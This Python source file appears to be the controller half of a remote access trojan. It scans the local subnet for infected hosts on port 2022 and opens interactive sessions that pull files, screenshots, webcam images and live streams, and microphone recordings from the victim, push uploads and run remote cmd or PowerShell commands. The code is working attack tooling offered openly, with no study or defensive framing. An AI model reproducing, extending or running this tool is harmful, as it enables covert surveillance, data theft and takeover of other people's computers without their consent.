# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 24.02.2026
# APP: SESSION
# TYPE: SOCKET_BOT
# VERSION: LATEST
# PLATFORM: ANY




#
#-
#--
#---
#----
#-----
#------
PORT = 2022 # RESPONSIBLE FOR SERVER PORT
#------
#-----
#----
#---
#--
#-
#




from os import _exit as os_exit, path, mkdir, name as os_name
from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
from concurrent.futures import ThreadPoolExecutor
from zlib import compressobj, decompressobj
from webbrowser import open as open_html
from subprocess import run as sp_run
from ipaddress import ip_network
from random import seed, randint
from datetime import datetime
from os.path import isfile
from io import StringIO
from time import sleep




_x00 = b'\x00\x00\x00\x00'
_exit = lambda: os_exit(0)
html = '''<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="1">
    <title>{}</title>
    <style>
        img {{ max-width: 100%; }}
    </style>
</head>
<body>
{}
</body>
</html>
'''




def init_session(ip, info):
    global PATH_DOWNLOADS, PATH_ZIP, PATH_SCREENSHOT, PATH_WEBCAMSHOT, PATH_AUDIO, PATH_SHARE

    PATH = f'session-{ip}'
    FILE_INFO = path.join(PATH, 'info.txt')
    PATH_DOWNLOADS = path.join(PATH, 'downloads')
    PATH_ZIP = path.join(PATH, 'zip')
    PATH_SCREENSHOT = path.join(PATH, 'screenshot')
    PATH_WEBCAMSHOT = path.join(PATH, 'webcamshot')
    PATH_AUDIO = path.join(PATH, 'audio')
    PATH_SHARE = path.join(PATH, 'share')

    for n in [
        PATH, 
        PATH_DOWNLOADS, 
        PATH_ZIP, 
        PATH_SCREENSHOT, 
        PATH_WEBCAMSHOT, 
        PATH_AUDIO, 
        PATH_SHARE
    ]:
        if not path.isdir(n):
            mkdir(n)

    if not path.isfile(FILE_INFO):
        with open(FILE_INFO, 'w') as f:
            f.write(info)


def get_date():
    try:
        now = datetime.now()

        return [now.strftime('%H-%M-%S'), now.strftime('%d.%m.%Y')]
    except:
        return ['00-00-00', '00.00.0000']
    

def print_info(text):
    clear()
    print(text)
    sleep(3)
    clear()


def clear():
    sp_run('cls' if os_name == 'nt' else 'clear', shell=True)


def ctrl_c(exit_):
    while True:
        try:
            clear()

            if input('Do you want to exit\nYes\\No: ').strip().lower() == 'yes':
                return exit_() 
            else: 
                clear()
                break
        except:
            continue


def encrypt(data):
    k0, k1 = KEY
    f = 0

    with StringIO() as buf:
        for (i, c) in enumerate(data):
            n = ord(c)  
            x = (n << k0) ^ (((k1 + f) + i) & 0xFF)
            f = (f ^ x) & 0xFF
            
            buf.write(chr(x))
        
        return buf.getvalue()


def decrypt(data):
    k0, k1 = KEY
    f = 0

    with StringIO() as buf:
        for (i, c) in enumerate(data):
            n = ord(c)     
            x = n ^ (((k1 + f) + i) & 0xFF)  
            o = x >> k0        
            f = (f ^ n) & 0xFF 
            
            buf.write(chr(o))
        
        return buf.getvalue()


def send(sock, data, doc=''):
    if isinstance(data, str):
        data = encrypt(data).encode() 

    ptr_data = data if isinstance(data, memoryview) else memoryview(data)
    buf = bytearray()
    chunk_size = 262_144
    compressor = compressobj(wbits=-15, level=9, memLevel=9)

    del data

    for n in range(0, len(ptr_data), chunk_size):
        buf.extend(compressor.compress(ptr_data[n:n + chunk_size]))

        if buf:
            sock.sendall(len(buf).to_bytes(4, 'big'))
            sock.recv(1)            
            sock.sendall(buf)
            buf.clear()

    buf.extend(compressor.flush())

    if buf:
        sock.sendall(len(buf).to_bytes(4, 'big'))
        sock.recv(1)
        sock.sendall(buf)
        buf.clear()

    sock.sendall(_x00)
    sock.recv(1)


def recv_all(sock, size):
    buf = bytearray(size)  
    ptr = memoryview(buf)
    received = 0           

    while received < size:
        chunk = sock.recv(size - received)
        len_chunk = len(chunk)

        if not len_chunk:
            raise ConnectionError
        
        ptr[received:received + len_chunk] = chunk
        received += len_chunk

    return ptr


def recv_bytes(sock):
    buf = bytearray()  
    decompressor = decompressobj(wbits=-15)

    while True:
        len_data = int.from_bytes(recv_all(sock, 4), 'big')

        if not len_data: 
            sock.sendall(b'\x00')
            break

        sock.sendall(b'\x01')  

        chunk = recv_all(sock, len_data)
        buf.extend(decompressor.decompress(chunk))

    buf.extend(decompressor.flush())

    return memoryview(buf)


def recv_text(sock):
    decompressor = decompressobj(wbits=-15)

    with StringIO() as buf:
        while True:
            len_data = int.from_bytes(recv_all(sock, 4), 'big')

            if not len_data:  
                sock.sendall(b'\x00')
                break

            sock.sendall(b'\x01')

            chunk = recv_all(sock, len_data)
            buf.write(decrypt(decompressor.decompress(chunk).decode()))

        last = decompressor.flush()

        if last:
            buf.write(decrypt(last.decode()))

        return buf.getvalue()


def recv(sock, b=False):
    return (recv_bytes if b else recv_text)(sock)


def get_ip():
    try:
        with socket(AF_INET, SOCK_DGRAM) as sock:
            sock.settimeout(1)
            sock.connect(('203.0.113.42', 4242))

            return sock.getsockname()[0]
    except:
        raise ValueError('ip is empty')
        

def check_ip(ip):
    ip = str(ip)

    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.settimeout(1)

        try:
            sock.connect((ip, PORT))
            sock.sendall(b'0x1155cea24bacb916')
            server_seed = int(sock.recv(64).decode())

            return [ip, server_seed]
        except:
            return False
        

def find_server(ip):
    mask = ip_network(ip[:ip.rindex('.') + 1] + '0/24').hosts()

    with ThreadPoolExecutor(max_workers=25) as pool:
        found = [n for n in pool.map(check_ip, mask) if n]

    return found


def connect_server(ip, seed_):
    global KEY

    seed(seed_)
    KEY = (randint(1, 8), randint(1, 256))

    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect((ip, PORT))

        sock.sendall(b'0x7294cc821afdc797')
        sock.recv(64)

        clear()
        print(recv(sock))

        sock.sendall(b'0x628057b78a560e64')
        node = recv(sock)

        sock.sendall(b'0x3856b3888f50563b')
        info = recv(sock)

        while True:
            init_session(ip, info)
            sock.sendall(b'0x403d9ff550597db8')
             
            try:
                cmd = input(f'{ip}@{node}> ').strip()

                if not cmd:
                    send(sock, 'empty')
                    continue
            except KeyboardInterrupt:
                if ctrl_c(lambda: True):
                    send(sock, 'exit')
                    print_info(f'session is left ({ip}) [+]') 
                    return
                
                send(sock, 'clear')
                continue
            except:
                send(sock, 'clear')
                continue
            
            match cmd:
                case 'exit':
                    send(sock, 'exit')
                    print_info(f'session is left ({ip}) [+]')
                    return
                case 'clear':
                    send(sock, 'clear')
                    clear()
                case 'cat' | 'upload' | 'audio' | 'share':
                    send(sock, cmd)
                    print(recv(sock))
                case 'zip':
                    send(sock, 'zip')

                    zip_path = path.join(PATH_ZIP, recv(sock))
                    sock.sendall(b'0x56f347625c8f5549')
                    zip_data = recv(sock, b=True)

                    if zip_data == _x00:
                        print('failed to make archive [-]')
                        continue

                    with open(zip_path, 'wb') as f:
                        f.write(zip_data)

                    print(f'({zip_path}) [+]')    
                    
                    del zip_data
                case 'screen -s' | 'webcam' as shot:
                    is_screen = shot == 'screen -s'

                    send(sock, shot)

                    stime, sdate = get_date()
                    shot_path = path.join(PATH_SCREENSHOT if is_screen else PATH_WEBCAMSHOT, f'{stime}_{sdate}.png')

                    png = recv(sock, b=True)

                    if png == _x00:
                        print(f'failed to take screenshot {"" if is_screen else "from webcam"} [-]')
                        continue

                    with open(shot_path, 'wb') as f:
                        f.write(png)

                    print(f'({shot_path}) [+]')

                    del png
                case _:
                    if cmd.startswith('cat'):
                        send(sock, cmd)

                        cat_name = recv(sock)
                        cat_path = path.join(PATH_DOWNLOADS, cat_name)
                        sock.sendall(b'0x53f17505eea476c0')
                        cat_data = recv(sock, b=True)

                        if cat_data == _x00:
                            print(f'failed to download file ({cat_name}) [-]')
                            continue

                        with open(cat_path, 'wb') as f:
                            f.write(cat_data)

                        print(f'({cat_path}) [+]')  

                        del cat_data
                    elif cmd.startswith('upload'): 
                        file_path = cmd.split(maxsplit=1)[-1]

                        if not isfile(file_path):
                            print(f'file does not exist ({file_path}) [*]')
                            send(sock, 'empty')
                            continue

                        send(sock, cmd)
                        
                        send(sock, file_path)
                        sock.recv(64)
                        
                        with open(file_path, 'rb') as f:
                            send(sock, memoryview(f.read()))
                        
                        print(f'file is uploaded ({file_path}) [+]')
                    elif cmd.startswith('cmd') or cmd.startswith('powershell'):
                        send(sock, cmd)

                        while True:
                            cmd_path = recv(sock)

                            try:
                                wincmd = input(cmd_path).strip()
                            except KeyboardInterrupt:
                                print()
                                send(sock, 'exit')
                                break
                            except:
                                send(sock, 'next')
                                continue

                            if (wincmd == '') or (
                            wincmd == 'cmd') or (wincmd == 'powershell'):
                                send(sock, 'next')
                            elif wincmd == 'clear':
                                clear()
                                send(sock, 'next')                           
                            elif wincmd == 'exit':
                                print()
                                send(sock, 'exit')
                                break
                            else:
                                send(sock, wincmd)
                                print(recv(sock), flush=True)   
                    elif cmd.startswith('audio') and ('-p' not in cmd):
                        send(sock, cmd)
                        print(recv(sock))
                        sock.sendall(b'0x75d4bbca044e8c63')
                        
                        stime, sdate = get_date()
                        audio_path = path.join(PATH_AUDIO, f'{stime}_{sdate}.mp3')
                        audio_data = recv(sock, b=True)

                        if audio_data == _x00:
                            print('failed to record audio [-]')
                            continue
                        
                        with open(audio_path, 'wb') as f:
                            f.write(audio_data)

                        print(f'({audio_path}) [+]')  

                        del audio_data
                    elif cmd.startswith('share'):
                        send(sock, cmd)

                        if sock.recv(64) == b'\x00':
                            print('failed to share webcam [-]') 
                            continue

                        index_html = path.join(PATH_SHARE, 'index.html')

                        with open(index_html, 'w') as f:
                            if '-a' in cmd:
                                file_share = path.join(PATH_SHARE, 'audio.mp3')

                                f.write(html.format(
                                    node,
                                    (
                                        '    <audio controls autoplay>\n' 
                                        f'        <source src="{path.abspath(file_share)}" type="audio/mpeg">\n'
                                        '    </audio>'
                                    )
                                ))
                            else:
                                file_share = path.join(PATH_SHARE, 'img.png')

                                f.write(html.format(
                                    node,
                                    f'    <img src="{path.abspath(file_share)}" width="1080" title="{ip}" alt="{ip}">'
                                ))

                        print(f'({index_html}) [+]')

                        try:
                            open_html(index_html)
                        except: 
                            print(f'failed to open html ({index_html}) [*]')

                        print('ctrl + c  —  Stop share')
                            
                        while True:
                            with open(file_share, 'wb') as f:
                                try:
                                    f.write(recv(sock, b=True))
                                    sock.sendall(b'0x213f13f279d00a91')
                                    sleep(1)
                                except:
                                    f.write(recv(sock, b=True))
                                    sock.sendall(b'0x2a44738d62feabcf')
                                    break
                    else:
                        send(sock, cmd)
                        print(recv(sock), flush=True) 


def main():
    if not isinstance(PORT, int):
        raise TypeError('(PORT) must be (int)')

    if PORT < 1:
        raise ValueError('(PORT) is invalid')

    clear()

    while True:
        print('AUTHOR: Vladislav Khudash')

        try:
            is_find = input('\nDo you want to find sessions\nYes\\No: ').strip().lower()
        except KeyboardInterrupt:
            ctrl_c(_exit)
            continue
        except:
            clear()
            continue 

        if is_find == 'exit':
            clear()
            _exit() 

        is_find = is_find == 'yes'

        if not is_find:
            clear()
            continue

        try:
            ip = get_ip()
        except ValueError:
            print_info('failed to get your ip [-]')
            continue

        clear()
        print('find for sessions has started [*]')

        found_session = find_server(ip)

        if not found_session:
            print_info('sessions not found [-]')
            continue
        
        clear()

        sessions = {}
        sid = 0

        for n in found_session:
            sip, sseed = n[0], n[1]

            sessions[str(sid)] = [sip, sseed]
            print(f'id: {sid} | session: {sip}')
            sid += 1

        print_sessions = sessions.items()
        
        while True:
            try:
                session_id = input('\nEnter session id: ').strip()
            except KeyboardInterrupt:
                if ctrl_c(lambda: True):
                    clear()     
                    break
                
                session_id = ''
            except:
                clear()
                continue

            if session_id == 'exit':
                clear()
                break

            session = sessions.get(session_id)

            if session is None:
                clear()

                for (sid, sip) in print_sessions:
                    print(f'id: {sid} | session: {sip[0]}')

                continue

            server_ip, server_seed = session

            try:
                connect_server(server_ip, server_seed)
            except ConnectionError:
                print_info(f'connection to session was interrupted ({server_ip}) [-]')
            except BaseException as error:
                print_info(f'session was interrupted ({server_ip}) [-]\n\n{type(error).__name__}({error})')

            clear()
            break


if __name__ == '__main__': main()